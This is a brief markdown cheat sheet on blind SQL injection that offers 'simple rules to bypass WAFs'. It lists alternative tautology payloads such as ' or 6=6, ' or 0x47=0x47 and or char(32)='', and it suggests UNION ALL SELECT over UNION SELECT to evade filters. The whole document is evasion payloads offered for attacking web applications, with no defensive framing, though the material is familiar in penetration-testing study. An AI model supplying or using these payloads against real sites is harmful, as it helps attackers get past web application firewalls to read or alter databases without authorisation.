<h1>$${\color{red}Blind} \space {\color{Goldenrod}SQL}\space {\color{blue}Injection}$$</h1>

## Simple Rules to Bypass WAFs


### 1. Instead of using:

```' or 1=1```

### The best choice is:

```
' or 6=6
' or 0x47=0x47
or char(32)=''
or 6 is not null
```

--------------

## SQL Injection

### 2. Instead of using:

```UNION SELECT```

### The best choice is:

```
UNION ALL SELECT
```
